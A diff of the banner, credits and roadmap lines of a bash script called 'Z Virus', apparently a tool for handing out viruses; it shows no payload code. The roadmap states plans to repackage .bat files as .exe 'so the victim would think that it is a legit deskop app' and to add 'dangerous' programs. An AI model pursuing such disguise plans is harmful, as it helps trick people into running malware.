@@ -11,7 +11,7 @@ echo -e " ░░▒ ▒ ░ ▒      ░ ░░   ▒ ░  ░▒ ░ ▒░░�
 echo -e " ░ ░ ░ ░ ░        ░░   ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░  "
 echo -e "   ░ ░             ░   ░     ░        ░           ░  "
 echo -e " ░                ░                                  \e[0m"
-echo -e "\e[91m     --- Z Virus version 1.1 | Coded By: Zech ---\e[0m"
+echo -e "\e[91m --- Z Virus Current Version 1.1 | Coded By: Zech ---\e[0m"
 echo -e "\e[34m\"If you are too lazy to type a single command,"
 echo -e " Allow my programs to do it for you.\"\e[0m"
 echo -e " -\e[90m(https://github.com/ZechBron)\e[0m\n"
@@ -1114,22 +1114,20 @@ elif [ $zCh = 4 ]; then
    fi
 
 elif [ $zCh = 5 ]; then
-echo -e "\e[92mCoded By:\e[0m\e[94m Zech\e[0m"
+echo -e "\e[92mCoded By:\e[0m\e[94m Zech Bron\e[0m"
 echo -e "\e[92mCredits To:\e[0m \e[94mGameye98 & LOolzeC"
 echo -e " I don't know where they find those viruses.\e[0m\n"
 
 echo -e "\e[36mIf you encounter an error. Please send me a message here \e[0m\e[96m'zech@mbox.re'\e[0m\e[0m\n"
 
 echo -e "\e[92mFUTURE UPDATES:\e[0m"
-echo -e "Note:\n This update may change depends in the situation."
-echo -e "\e[32mVersion 1.1\e[0m"
-echo -e "\e[34m -> This code is too long and I wanted to make it short and simple."
-echo -e " -> Gonna fix errors like misspelled variables.\e[0m"
-echo -e "\e[32mVersion 1.2\e[0m"
-echo -e "\e[34m -> Fix bugs and add error handling\e[0m"
-echo -e "\e[92mFuture Version: Version 1.? - Wait for this guyz.\e[0m"
+echo -e "\e[32mVersion 1.4\e[0m"
+echo -e "\e[92mFeatures Version: - Will be posted on January 2021.\e[0m"
 echo -e "\e[34m -> Additional download link incase the other one didn't work."
-echo -e " -> Bat files will be converted into exe file so the victim would think that it is a legit deskop app.\e[0m"
+echo -e " -> Bat files will be converted into exe file so the victim would think that it is a legit deskop app."
+echo -e " -> I will also include my dangerous or a little bit dangerous programs"
+echo -e " -> Converted into Python 3\e[0m"
+echo -e "NOTE:\n If you have any suggestions, comments, questions or anything. Just email me here: zech@mbox.re"
 else
       echo -e "\e[91mWrong input. Try again.\e[0m"
 fi
